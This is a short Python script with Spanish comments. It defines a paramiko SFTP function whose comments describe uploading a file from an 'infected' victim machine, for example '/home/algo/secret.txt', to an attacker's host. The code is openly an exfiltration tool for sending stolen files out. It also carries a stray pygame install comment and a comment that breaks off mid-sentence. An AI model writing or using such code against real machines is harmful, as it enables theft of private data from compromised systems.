#!/bin/python
# -*- coding: utf-8 -*-

#Instalar pygame: apt-get install python-pygame -y
import paramiko


def subir(rutaAtacante,rutaVictima, host, username, password ):
#La rutaVictima es la del equipo infectado, se igresa el nombre del archivo y su ruta ejemplo "/home/algo/secret.txt"
#La rutaAtacante es la ruta del equipo qque se usará para 

    port = 22	
    transport = paramiko.Transport((host, port))
    transport.connect(username = username, password = password)
    sftp = paramiko.SFTPClient.from_transport(transport)
    sftp.put(rutaVictima, rutaAtacante)
	
